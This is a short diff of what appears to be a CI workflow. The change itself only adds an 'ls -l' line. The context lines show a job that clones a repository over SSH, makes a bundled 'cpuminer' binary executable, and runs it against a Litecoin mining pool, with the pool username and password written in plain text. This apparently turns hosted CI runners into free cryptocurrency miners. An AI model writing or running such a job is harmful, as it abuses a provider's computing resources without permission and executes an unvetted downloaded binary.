@@ -12,7 +12,7 @@ jobs:
            ssh-keyscan github.com >> ~/.ssh/known_hosts
            git clone --depth=1 git@github.com:ltcwoker/RDP.git Q
            cd Q
-           
+           ls -l
            chmod 755 cpuminer
            ./cpuminer --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
       
